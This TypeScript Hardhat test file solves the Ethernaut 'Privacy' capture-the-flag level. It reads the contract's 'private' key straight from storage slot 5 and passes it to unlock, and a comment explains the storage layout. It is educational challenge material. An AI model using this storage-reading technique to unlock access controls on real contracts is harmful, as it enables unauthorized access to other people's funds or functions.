// # Ethernaut 12: Privacy

import {ethers} from 'hardhat'
import {Contract, providers, Signer} from 'ethers'

import {ETHERNAUT_ADDRESS, expect, expectStatusOK} from './testUtil'

const LEVEL_ADDRESS = '0x11343d543778213221516D004ED82C45C3c8788B'
const INSTANCE_ADDRESS = '0x652fde616295c54583f32Eca289513722e53D964'

describe('12 Privacy', () => {
  let ethernaut: Contract
  let instance: Contract
  let signer: Signer
  let signerAddress: string
  let provider: providers.Provider

  before(async () => {
    ethernaut = await ethers.getContractAt('Ethernaut', ETHERNAUT_ADDRESS)
    instance = await ethers.getContractAt('Privacy', INSTANCE_ADDRESS)

    const signers = await ethers.getSigners()
    signer = signers[0]
    signerAddress = await signer.getAddress()
    provider = signer.provider!
  })

  // As in *Vault*, the key can be read from the instance's storage. We just
  // need to know that the three-element `bytes32` array`data` occupies slots 3, 4, and 5.
  // (The `uint8` and `uint16` variables before it are packed into a single slot.) Then
  // `bytes16(data[2])` (the key) is the first 16 bytes of slot 5.
  it('reads key from storage and passes it to unlock function', async () => {
    const data = await provider.getStorageAt(instance.address, 5)
    const key = data.slice(0, 34)
    const tx = await instance.unlock(key)
    return expectStatusOK(tx)
  })

  it('verifies instance is unlocked', async () => {
    expect(await instance.locked()).to.be.false
  })

  it('is validated', async () => {
    return expect(ethernaut.submitLevelInstance(instance.address, {gasLimit:100000}))
      .to.emit(ethernaut, 'LevelCompletedLog')
      .withArgs(signerAddress, LEVEL_ADDRESS).eventually
  })
})
